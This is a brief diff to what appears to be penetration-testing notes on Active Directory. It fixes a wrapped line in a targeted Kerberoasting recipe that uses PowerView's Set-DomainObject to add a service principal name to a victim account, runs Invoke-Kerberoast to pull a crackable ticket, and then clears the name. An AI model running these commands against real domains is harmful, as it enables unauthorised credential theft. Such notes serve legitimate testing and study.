@@ -1061,8 +1061,7 @@ Set-DomainObject -Identity VictimTK -Clear serviceprincipalname
 Invoke-Kerberoast
 
 2. Set DomainObject on the VictimTK Account.
-Set-DomainObject -Identity VictimTK -Set @{serviceprincipalname='B
-ANK/myspn'} -Credential
+Set-DomainObject -Identity VictimTK -Set @{serviceprincipalname='BANK/myspn'} -Credential
 
 3. Checker (After)
 Invoke-Kerberoast
